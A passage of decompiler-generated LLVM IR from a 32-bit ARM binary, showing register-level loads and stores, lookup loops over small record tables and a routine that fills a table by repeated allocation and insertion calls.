  %v0_a340 = phi i32 [ %v3_a294, %dec_label_pc_a294 ], [ %v3_a32c, %dec_label_pc_a324 ]
  %v2_a340 = call i32 @function_14dd8(i32 %v0_a340, i32 9)
  %v3_a344 = load i32, i32* @global_var_22338.62, align 4
  store i32 %v3_a344, i32* @r0, align 4
  %v2_a348 = icmp eq i32 %v3_a344, 0
  %v0_a34c = load i32, i32* @r5, align 4
  store i32 %v0_a34c, i32* @global_var_22334.61, align 4
  br i1 %v2_a348, label %dec_label_pc_a2b4, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a2a4, %dec_label_pc_a33c
  %v0_a358 = phi i32 [ %v3_a2a4, %dec_label_pc_a2a4 ], [ %v3_a344, %dec_label_pc_a33c ]
  %v2_a358 = call i32 @function_14dd8(i32 %v0_a358, i32 9)
  %v3_a35c = load i32, i32* @global_var_2233c.63, align 4
  store i32 %v3_a35c, i32* @r0, align 4
  %v2_a360 = icmp eq i32 %v3_a35c, 0
  %v0_a364 = load i32, i32* @r5, align 4
  store i32 %v0_a364, i32* @global_var_22338.62, align 4
  br i1 %v2_a360, label %dec_label_pc_a2c4, label %dec_label_pc_a36c

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a354
  %v0_a370 = phi i32 [ %v3_a2b4, %dec_label_pc_a2b4 ], [ %v3_a35c, %dec_label_pc_a354 ]
  %v2_a370 = call i32 @function_14dd8(i32 %v0_a370, i32 9)
  %v3_a374 = load i32, i32* @global_var_22340.64, align 4
  store i32 %v3_a374, i32* @r0, align 4
  %v2_a378 = icmp eq i32 %v3_a374, 0
  %v0_a37c = load i32, i32* @r5, align 4
  store i32 %v0_a37c, i32* @global_var_2233c.63, align 4
  br i1 %v2_a378, label %dec_label_pc_a2d4, label %dec_label_pc_a384

dec_label_pc_a384:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a36c
  %v0_a388 = phi i32 [ %v3_a2c4, %dec_label_pc_a2c4 ], [ %v3_a374, %dec_label_pc_a36c ]
  %v2_a388 = call i32 @function_14dd8(i32 %v0_a388, i32 9)
  %v3_a38c = load i32, i32* @global_var_22344.65, align 4
  store i32 %v3_a38c, i32* @r0, align 4
  %v2_a390 = icmp eq i32 %v3_a38c, 0
  %v0_a394 = load i32, i32* @r5, align 4
  store i32 %v0_a394, i32* @global_var_22340.64, align 4
  br i1 %v2_a390, label %dec_label_pc_a2e4, label %dec_label_pc_a39c

dec_label_pc_a39c:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a384
  %v0_a3a0 = phi i32 [ %v3_a2d4, %dec_label_pc_a2d4 ], [ %v3_a38c, %dec_label_pc_a384 ]
  %v2_a3a0 = call i32 @function_14dd8(i32 %v0_a3a0, i32 9)
  %v3_a3a4 = load i32, i32* @global_var_22348.66, align 4
  store i32 %v3_a3a4, i32* @r0, align 4
  %v2_a3a8 = icmp eq i32 %v3_a3a4, 0
  %v0_a3ac = load i32, i32* @r5, align 4
  store i32 %v0_a3ac, i32* @global_var_22344.65, align 4
  br i1 %v2_a3a8, label %dec_label_pc_a2f4, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a39c
  %v0_a3b8 = phi i32 [ %v3_a2e4, %dec_label_pc_a2e4 ], [ %v3_a3a4, %dec_label_pc_a39c ]
  %v2_a3b8 = call i32 @function_14dd8(i32 %v0_a3b8, i32 9)
  %v0_a2f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a2f4

; uselistorder directives
  uselistorder i32 %v0_a3ac, { 1, 0 }
  uselistorder i32 %v0_a394, { 1, 0 }
  uselistorder i32 %v0_a37c, { 1, 0 }
  uselistorder i32 %v0_a364, { 1, 0 }
  uselistorder i32 %v0_a34c, { 1, 0 }
  uselistorder i32 %v0_a334, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a39c, { 1, 0 }
  uselistorder label %dec_label_pc_a384, { 1, 0 }
  uselistorder label %dec_label_pc_a36c, { 1, 0 }
  uselistorder label %dec_label_pc_a354, { 1, 0 }
  uselistorder label %dec_label_pc_a33c, { 1, 0 }
  uselistorder label %dec_label_pc_a2f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a2e4, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
  uselistorder label %dec_label_pc_a2c4, { 1, 0 }
  uselistorder label %dec_label_pc_a2b4, { 1, 0 }
  uselistorder label %dec_label_pc_a2a4, { 1, 0 }
}

define i32 @function_a3c4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a3c4:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a3c4 = icmp eq i32 %arg1, 0
  %v3_a3c8 = load i32, i32* @r4, align 4
  store i32 %v3_a3c8, i32* %stack_var_-8, align 4
  %v6_a3c8 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a3c4, label %dec_label_pc_a40c, label %dec_label_pc_a3d4

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a3c4
  %v0_a3d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a3d4 = add i32 %v0_a3d4, 4
  %v2_a3d4 = inttoptr i32 %v1_a3d4 to i8*
  %v3_a3d4 = load i8, i8* %v2_a3d4, align 1
  %v4_a3d4 = zext i8 %v3_a3d4 to i32
  %v9_a3d8 = icmp eq i32 %v4_a3d4, %arg3
  br i1 %v9_a3d8, label %dec_label_pc_a418, label %dec_label_pc_a3fc.preheader

dec_label_pc_a3fc.preheader:                      ; preds = %dec_label_pc_a3d4
  br label %dec_label_pc_a3fc

dec_label_pc_a3ec:                                ; preds = %dec_label_pc_a3fc
  %v1_a3ec = add i32 %v0_a3f4.in, 12
  %v2_a3ec = inttoptr i32 %v1_a3ec to i8*
  %v3_a3ec = load i8, i8* %v2_a3ec, align 1
  %v4_a3ec = zext i8 %v3_a3ec to i32
  %v9_a3f0 = icmp eq i32 %v4_a3ec, %arg3
  br i1 %v9_a3f0, label %dec_label_pc_a418, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3fc.preheader, %dec_label_pc_a3ec
  %v0_a3f4.in = phi i32 [ %v0_a3d4, %dec_label_pc_a3fc.preheader ], [ %v0_a3f4, %dec_label_pc_a3ec ]
  %v0_a3fc = phi i32 [ 0, %dec_label_pc_a3fc.preheader ], [ %v1_a3fc, %dec_label_pc_a3ec ]
  %v0_a3f4 = add i32 %v0_a3f4.in, 8
  %v1_a3fc = add i32 %v0_a3fc, 1
  store i32 %v1_a3fc, i32* @lr, align 4
  %v9_a400 = icmp eq i32 %v1_a3fc, %arg1
  store i32 %v0_a3f4, i32* %r1.global-to-local, align 4
  br i1 %v9_a400, label %dec_label_pc_a40c, label %dec_label_pc_a3ec

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3fc, %dec_label_pc_a418, %dec_label_pc_a3c4, %dec_label_pc_a424
  %v2_a410 = phi i32 [ %v3_a3c8, %dec_label_pc_a418 ], [ %v3_a3c8, %dec_label_pc_a3c4 ], [ %v2_a410.pre, %dec_label_pc_a424 ], [ %v3_a3c8, %dec_label_pc_a3fc ]
  %v0_a40c = phi i32 [ %arg4, %dec_label_pc_a418 ], [ %arg4, %dec_label_pc_a3c4 ], [ %v1_a424, %dec_label_pc_a424 ], [ %arg4, %dec_label_pc_a3fc ]
  store i32 %v2_a410, i32* @r4, align 4
  store i32 %v6_a3c8, i32* @lr, align 4
  ret i32 %v0_a40c

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3ec, %dec_label_pc_a3d4
  %v0_a418 = phi i32 [ %v0_a3d4, %dec_label_pc_a3d4 ], [ %v0_a3f4, %dec_label_pc_a3ec ]
  %v1_a418 = inttoptr i32 %v0_a418 to i32*
  %v2_a418 = load i32, i32* %v1_a418, align 4
  store i32 %v2_a418, i32* @r0, align 4
  %v2_a41c = icmp eq i32 %v2_a418, 0
  br i1 %v2_a41c, label %dec_label_pc_a40c, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a418
  %v1_a424 = call i32 @function_14860(i32 %v2_a418)
  %v2_a410.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a40c

; uselistorder directives
  uselistorder i32 %v1_a3fc, { 1, 2, 0 }
  uselistorder i32 %v0_a3f4, { 1, 0, 2 }
  uselistorder i32 %v0_a3f4.in, { 1, 0 }
  uselistorder i32 %v0_a3d4, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a40c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a3fc, { 1, 0 }
}

define i32 @function_a430(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a430:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a430 = icmp eq i32 %arg1, 0
  %v3_a434 = load i32, i32* @r4, align 4
  store i32 %v3_a434, i32* %stack_var_-8, align 4
  %v6_a434 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a430, label %dec_label_pc_a478, label %dec_label_pc_a440

dec_label_pc_a440:                                ; preds = %dec_label_pc_a430
  %v0_a440 = load i32, i32* %r1.global-to-local, align 4
  %v1_a440 = add i32 %v0_a440, 4
  %v2_a440 = inttoptr i32 %v1_a440 to i8*
  %v3_a440 = load i8, i8* %v2_a440, align 1
  %v4_a440 = zext i8 %v3_a440 to i32
  %v9_a444 = icmp eq i32 %v4_a440, %arg3
  br i1 %v9_a444, label %dec_label_pc_a484, label %dec_label_pc_a468.preheader

dec_label_pc_a468.preheader:                      ; preds = %dec_label_pc_a440
  br label %dec_label_pc_a468

dec_label_pc_a458:                                ; preds = %dec_label_pc_a468
  %v1_a458 = add i32 %v0_a460.in, 12
  %v2_a458 = inttoptr i32 %v1_a458 to i8*
  %v3_a458 = load i8, i8* %v2_a458, align 1
  %v4_a458 = zext i8 %v3_a458 to i32
  %v9_a45c = icmp eq i32 %v4_a458, %arg3
  br i1 %v9_a45c, label %dec_label_pc_a484, label %dec_label_pc_a468

dec_label_pc_a468:                                ; preds = %dec_label_pc_a468.preheader, %dec_label_pc_a458
  %v0_a460.in = phi i32 [ %v0_a440, %dec_label_pc_a468.preheader ], [ %v0_a460, %dec_label_pc_a458 ]
  %v0_a468 = phi i32 [ 0, %dec_label_pc_a468.preheader ], [ %v1_a468, %dec_label_pc_a458 ]
  %v0_a460 = add i32 %v0_a460.in, 8
  %v1_a468 = add i32 %v0_a468, 1
  store i32 %v1_a468, i32* @lr, align 4
  %v9_a46c = icmp eq i32 %v1_a468, %arg1
  store i32 %v0_a460, i32* %r1.global-to-local, align 4
  br i1 %v9_a46c, label %dec_label_pc_a478, label %dec_label_pc_a458

dec_label_pc_a478:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a484, %dec_label_pc_a430, %dec_label_pc_a490
  %v2_a47c = phi i32 [ %v3_a434, %dec_label_pc_a484 ], [ %v3_a434, %dec_label_pc_a430 ], [ %v2_a47c.pre, %dec_label_pc_a490 ], [ %v3_a434, %dec_label_pc_a468 ]
  %v0_a478 = phi i32 [ %arg4, %dec_label_pc_a484 ], [ %arg4, %dec_label_pc_a430 ], [ %v3_a494, %dec_label_pc_a490 ], [ %arg4, %dec_label_pc_a468 ]
  store i32 %v2_a47c, i32* @r4, align 4
  store i32 %v6_a434, i32* @lr, align 4
  ret i32 %v0_a478

dec_label_pc_a484:                                ; preds = %dec_label_pc_a458, %dec_label_pc_a440
  %v0_a484 = phi i32 [ %v0_a440, %dec_label_pc_a440 ], [ %v0_a460, %dec_label_pc_a458 ]
  %v1_a484 = inttoptr i32 %v0_a484 to i32*
  %v2_a484 = load i32, i32* %v1_a484, align 4
  %v2_a488 = icmp eq i32 %v2_a484, 0
  br i1 %v2_a488, label %dec_label_pc_a478, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a484
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a494 = inttoptr i32 %v2_a484 to i8*
  %v3_a494 = call i32 @function_12448(i8* %v2_a494, i32 10)
  %v2_a47c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a478

; uselistorder directives
  uselistorder i32 %v1_a468, { 1, 2, 0 }
  uselistorder i32 %v0_a460, { 1, 0, 2 }
  uselistorder i32 %v0_a460.in, { 1, 0 }
  uselistorder i32 %v0_a440, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a478, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a468, { 1, 0 }
}

define i32 @function_a4a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_a4a0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a4b0 = call i32 @function_1320c(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_22324.53 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22328.55 to i32), i32* @r6, align 4
  store i32 52092, i32* %r2.global-to-local, align 4
  store i32 %v2_a4b0, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22325.70 to i32), i32* %r1.global-to-local, align 4
  %v2_a4d0 = load i32, i32* @global_var_22328.55, align 4
  %v2_a4d4 = inttoptr i32 %v2_a4b0 to i32*
  store i32 52092, i32* %v2_a4d4, align 4
  %v3_a4d8 = load i32, i32* @r4, align 4
  %v4_a4d8 = add i32 %v3_a4d8, 4
  %v5_a4d8 = inttoptr i32 %v4_a4d8 to i8*
  store i8 0, i8* %v5_a4d8, align 1
  %v0_a4dc = load i32, i32* %r1.global-to-local, align 4
  %v3_a4dc = mul i32 %v0_a4dc, 4
  store i32 %v3_a4dc, i32* %r1.global-to-local, align 4
  %v5_a4e0 = call i32 @function_143c8(i32 %v2_a4d0, i32 %v3_a4dc, i32 52092, i32 0)
  %v2_a4e4 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a4e4 = zext i8 %v2_a4e4 to i32
  store i32 %v5_a4e0, i32* %r2.global-to-local, align 4
  %v0_a4ec = load i32, i32* @r4, align 4
  %v5_a4ec = mul nuw nsw i32 %v3_a4e4, 4
  %v6_a4ec = add i32 %v5_a4ec, %v5_a4e0
  %v7_a4ec = inttoptr i32 %v6_a4ec to i32*
  store i32 %v0_a4ec, i32* %v7_a4ec, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22325.70 to i32), i32* %r3.global-to-local, align 4
  %v1_a4fc = load i32, i32* @r6, align 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  store i32 %v5_a4e0, i32* %v2_a4fc, align 4
  %v0_a500 = load i32, i32* %r3.global-to-local, align 4
  %v1_a500 = trunc i32 %v0_a500 to i8
  %v2_a500 = load i32, i32* @r5, align 4
  %v3_a500 = inttoptr i32 %v2_a500 to i8*
  store i8 %v1_a500, i8* %v3_a500, align 1
  %v2_a504 = call i32 @function_1320c(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d024.72 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a504, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_22325.70 to i32), i32* %r1.global-to-local, align 4
  %v2_a51c = load i32, i32* @global_var_22328.55, align 4
  %v2_a520 = inttoptr i32 %v2_a504 to i32*
  store i32 ptrtoint (i32* @global_var_d024.72 to i32), i32* %v2_a520, align 4
  %v0_a524 = load i32, i32* @r7, align 4
  %v1_a524 = trunc i32 %v0_a524 to i8
  %v2_a524 = load i32, i32* @r4, align 4
  %v3_a524 = add i32 %v2_a524, 4
  %v4_a524 = inttoptr i32 %v3_a524 to i8*
  store i8 %v1_a524, i8* %v4_a524, align 1
  %v0_a528 = load i32, i32* %r1.global-to-local, align 4
  %v3_a528 = mul i32 %v0_a528, 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v4_a52c = call i32 @function_143c8(i32 %v2_a51c, i32 %v3_a528, i32 %v5_a4e0, i32 ptrtoint (i32* @global_var_d024.72 to i32))
  %v2_a530 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a530 = zext i8 %v2_a530 to i32
  store i32 %v3_a530, i32* %r3.global-to-local, align 4
  store i32 %v4_a52c, i32* %r2.global-to-local, align 4
  %v0_a538 = load i32, i32* @r4, align 4
  %v5_a538 = mul nuw nsw i32 %v3_a530, 4
  %v6_a538 = add i32 %v5_a538, %v4_a52c
  %v7_a538 = inttoptr i32 %v6_a538 to i32*
  store i32 %v0_a538, i32* %v7_a538, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a540 = load i32, i32* %r3.global-to-local, align 4
  %v1_a540 = load i32, i32* @r7, align 4
  %v2_a540 = add i32 %v1_a540, %v0_a540
  store i32 %v2_a540, i32* %r3.global-to-local, align 4
  %v1_a548 = trunc i32 %v2_a540 to i8
  %v2_a548 = load i32, i32* @r5, align 4
  %v3_a548 = inttoptr i32 %v2_a548 to i8*
  store i8 %v1_a548, i8* %v3_a548, align 1
  %v0_a54c = load i32, i32* %r2.global-to-local, align 4
  %v1_a54c = load i32, i32* @r6, align 4
  %v2_a54c = inttoptr i32 %v1_a54c to i32*
  store i32 %v0_a54c, i32* %v2_a54c, align 4
  %v2_a550 = call i32 @function_1320c(i32 %v1_a540, i32 8)
  %v2_a554 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a554 = zext i8 %v2_a554 to i32
  store i32 ptrtoint (i32* @global_var_d430.74 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a550, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a564 = load i32, i32* @r7, align 4
  %v2_a564 = add i32 %v1_a564, %v3_a554
  store i32 %v2_a564, i32* %r1.global-to-local, align 4
  %v2_a568 = load i32, i32* @global_var_22328.55, align 4
  %v2_a56c = inttoptr i32 %v2_a550 to i32*
  store i32 ptrtoint (i32* @global_var_d430.74 to i32), i32* %v2_a56c, align 4
  %v3_a570 = load i32, i32* @r4, align 4
  %v4_a570 = add i32 %v3_a570, 4
  %v5_a570 = inttoptr i32 %v4_a570 to i8*
  store i8 2, i8* %v5_a570, align 1
  %v0_a574 = load i32, i32* %r1.global-to-local, align 4
  %v3_a574 = mul i32 %v0_a574, 4
  store i32 %v3_a574, i32* %r1.global-to-local, align 4
  %v5_a578 = call i32 @function_143c8(i32 %v2_a568, i32 %v3_a574, i32 ptrtoint (i32* @global_var_d430.74 to i32), i32 2)
  %v2_a57c = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a57c = zext i8 %v2_a57c to i32
  store i32 %v3_a57c, i32* %r3.global-to-local, align 4
  store i32 %v5_a578, i32* %r2.global-to-local, align 4
  %v0_a584 = load i32, i32* @r4, align 4
  %v5_a584 = mul nuw nsw i32 %v3_a57c, 4
  %v6_a584 = add i32 %v5_a584, %v5_a578
  %v7_a584 = inttoptr i32 %v6_a584 to i32*
  store i32 %v0_a584, i32* %v7_a584, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a58c = load i32, i32* %r3.global-to-local, align 4
  %v1_a58c = load i32, i32* @r7, align 4
  %v2_a58c = add i32 %v1_a58c, %v0_a58c
  store i32 %v2_a58c, i32* %r3.global-to-local, align 4
  %v1_a594 = trunc i32 %v2_a58c to i8
  %v2_a594 = load i32, i32* @r5, align 4
  %v3_a594 = inttoptr i32 %v2_a594 to i8*
  store i8 %v1_a594, i8* %v3_a594, align 1
  %v0_a598 = load i32, i32* %r2.global-to-local, align 4
  %v1_a598 = load i32, i32* @r6, align 4
  %v2_a598 = inttoptr i32 %v1_a598 to i32*
  store i32 %v0_a598, i32* %v2_a598, align 4
  %v2_a59c = call i32 @function_1320c(i32 %v1_a58c, i32 8)
  %v2_a5a0 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a5a0 = zext i8 %v2_a5a0 to i32
  store i32 ptrtoint (i32* @global_var_c8ec.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a59c, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a5b0 = load i32, i32* @r7, align 4
  %v2_a5b0 = add i32 %v1_a5b0, %v3_a5a0
  store i32 %v2_a5b0, i32* %r1.global-to-local, align 4
  %v2_a5b4 = load i32, i32* @global_var_22328.55, align 4
  %v2_a5b8 = inttoptr i32 %v2_a59c to i32*
  store i32 ptrtoint (i32* @global_var_c8ec.76 to i32), i32* %v2_a5b8, align 4
  %v3_a5bc = load i32, i32* @r4, align 4
  %v4_a5bc = add i32 %v3_a5bc, 4
  %v5_a5bc = inttoptr i32 %v4_a5bc to i8*
  store i8 9, i8* %v5_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5c0 = mul i32 %v0_a5c0, 4
  store i32 %v3_a5c0, i32* %r1.global-to-local, align 4
  %v5_a5c4 = call i32 @function_143c8(i32 %v2_a5b4, i32 %v3_a5c0, i32 ptrtoint (i32* @global_var_c8ec.76 to i32), i32 9)
  %v2_a5c8 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a5c8 = zext i8 %v2_a5c8 to i32
  store i32 %v3_a5c8, i32* %r3.global-to-local, align 4
  store i32 %v5_a5c4, i32* %r2.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r4, align 4
  %v5_a5d0 = mul nuw nsw i32 %v3_a5c8, 4
  %v6_a5d0 = add i32 %v5_a5d0, %v5_a5c4
  %v7_a5d0 = inttoptr i32 %v6_a5d0 to i32*
  store i32 %v0_a5d0, i32* %v7_a5d0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5d8 = load i32, i32* @r7, align 4
  %v2_a5d8 = add i32 %v1_a5d8, %v0_a5d8
  store i32 %v2_a5d8, i32* %r3.global-to-local, align 4
  %v1_a5e0 = trunc i32 %v2_a5d8 to i8
  %v2_a5e0 = load i32, i32* @r5, align 4
  %v3_a5e0 = inttoptr i32 %v2_a5e0 to i8*
  store i8 %v1_a5e0, i8* %v3_a5e0, align 1
  %v0_a5e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5e4 = load i32, i32* @r6, align 4
  %v2_a5e4 = inttoptr i32 %v1_a5e4 to i32*
  store i32 %v0_a5e4, i32* %v2_a5e4, align 4
  %v2_a5e8 = call i32 @function_1320c(i32 %v1_a5d8, i32 8)
  %v2_a5ec = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a5ec = zext i8 %v2_a5ec to i32
  store i32 ptrtoint (i32* @global_var_c270.78 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5e8, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a5fc = load i32, i32* @r7, align 4
  %v2_a5fc = add i32 %v1_a5fc, %v3_a5ec
  store i32 %v2_a5fc, i32* %r1.global-to-local, align 4
  %v2_a600 = load i32, i32* @global_var_22328.55, align 4
  %v2_a604 = inttoptr i32 %v2_a5e8 to i32*
  store i32 ptrtoint (i32* @global_var_c270.78 to i32), i32* %v2_a604, align 4
  %v3_a608 = load i32, i32* @r4, align 4
  %v4_a608 = add i32 %v3_a608, 4
  %v5_a608 = inttoptr i32 %v4_a608 to i8*
  store i8 3, i8* %v5_a608, align 1
  %v0_a60c = load i32, i32* %r1.global-to-local, align 4
  %v3_a60c = mul i32 %v0_a60c, 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v5_a610 = call i32 @function_143c8(i32 %v2_a600, i32 %v3_a60c, i32 ptrtoint (i32* @global_var_c270.78 to i32), i32 3)
  %v2_a614 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a614 = zext i8 %v2_a614 to i32
  store i32 %v3_a614, i32* %r3.global-to-local, align 4
  store i32 %v5_a610, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* @r4, align 4
  %v5_a61c = mul nuw nsw i32 %v3_a614, 4
  %v6_a61c = add i32 %v5_a61c, %v5_a610
  %v7_a61c = inttoptr i32 %v6_a61c to i32*
  store i32 %v0_a61c, i32* %v7_a61c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = load i32, i32* @r7, align 4
  %v2_a624 = add i32 %v1_a624, %v0_a624
  store i32 %v2_a624, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v2_a624 to i8
  %v2_a62c = load i32, i32* @r5, align 4
  %v3_a62c = inttoptr i32 %v2_a62c to i8*
  store i8 %v1_a62c, i8* %v3_a62c, align 1
  %v0_a630 = load i32, i32* %r2.global-to-local, align 4
  %v1_a630 = load i32, i32* @r6, align 4
  %v2_a630 = inttoptr i32 %v1_a630 to i32*
  store i32 %v0_a630, i32* %v2_a630, align 4
  %v2_a634 = call i32 @function_1320c(i32 %v1_a624, i32 8)
  %v2_a638 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a638 = zext i8 %v2_a638 to i32
  store i32 ptrtoint (i32* @global_var_bbb8.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a634, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a648 = load i32, i32* @r7, align 4
  %v2_a648 = add i32 %v1_a648, %v3_a638
  store i32 %v2_a648, i32* %r1.global-to-local, align 4
  %v2_a64c = load i32, i32* @global_var_22328.55, align 4
  %v2_a650 = inttoptr i32 %v2_a634 to i32*
  store i32 ptrtoint (i32* @global_var_bbb8.80 to i32), i32* %v2_a650, align 4
  %v3_a654 = load i32, i32* @r4, align 4
  %v4_a654 = add i32 %v3_a654, 4
  %v5_a654 = inttoptr i32 %v4_a654 to i8*
  store i8 4, i8* %v5_a654, align 1
  %v0_a658 = load i32, i32* %r1.global-to-local, align 4
  %v3_a658 = mul i32 %v0_a658, 4
  store i32 %v3_a658, i32* %r1.global-to-local, align 4
  %v5_a65c = call i32 @function_143c8(i32 %v2_a64c, i32 %v3_a658, i32 ptrtoint (i32* @global_var_bbb8.80 to i32), i32 4)
  %v2_a660 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a660 = zext i8 %v2_a660 to i32
  store i32 %v3_a660, i32* %r3.global-to-local, align 4
  store i32 %v5_a65c, i32* %r2.global-to-local, align 4
  %v0_a668 = load i32, i32* @r4, align 4
  %v5_a668 = mul nuw nsw i32 %v3_a660, 4
  %v6_a668 = add i32 %v5_a668, %v5_a65c
  %v7_a668 = inttoptr i32 %v6_a668 to i32*
  store i32 %v0_a668, i32* %v7_a668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a670 = load i32, i32* %r3.global-to-local, align 4
  %v1_a670 = load i32, i32* @r7, align 4
  %v2_a670 = add i32 %v1_a670, %v0_a670
  store i32 %v2_a670, i32* %r3.global-to-local, align 4
  %v1_a678 = trunc i32 %v2_a670 to i8
  %v2_a678 = load i32, i32* @r5, align 4
  %v3_a678 = inttoptr i32 %v2_a678 to i8*
  store i8 %v1_a678, i8* %v3_a678, align 1
  %v0_a67c = load i32, i32* %r2.global-to-local, align 4
  %v1_a67c = load i32, i32* @r6, align 4
  %v2_a67c = inttoptr i32 %v1_a67c to i32*
  store i32 %v0_a67c, i32* %v2_a67c, align 4
  %v2_a680 = call i32 @function_1320c(i32 %v1_a670, i32 8)
  %v2_a684 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a684 = zext i8 %v2_a684 to i32
  store i32 ptrtoint (i32* @global_var_b420.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a680, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a694 = load i32, i32* @r7, align 4
  %v2_a694 = add i32 %v1_a694, %v3_a684
  store i32 %v2_a694, i32* %r1.global-to-local, align 4
  %v2_a698 = load i32, i32* @global_var_22328.55, align 4
  %v2_a69c = inttoptr i32 %v2_a680 to i32*
  store i32 ptrtoint (i32* @global_var_b420.82 to i32), i32* %v2_a69c, align 4
  %v3_a6a0 = load i32, i32* @r4, align 4
  %v4_a6a0 = add i32 %v3_a6a0, 4
  %v5_a6a0 = inttoptr i32 %v4_a6a0 to i8*
  store i8 5, i8* %v5_a6a0, align 1
  %v0_a6a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6a4 = mul i32 %v0_a6a4, 4
  store i32 %v3_a6a4, i32* %r1.global-to-local, align 4
  %v5_a6a8 = call i32 @function_143c8(i32 %v2_a698, i32 %v3_a6a4, i32 ptrtoint (i32* @global_var_b420.82 to i32), i32 5)
  %v2_a6ac = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_a6ac = zext i8 %v2_a6ac to i32
  store i32 %v3_a6ac, i32* %r3.global-to-local, align 4
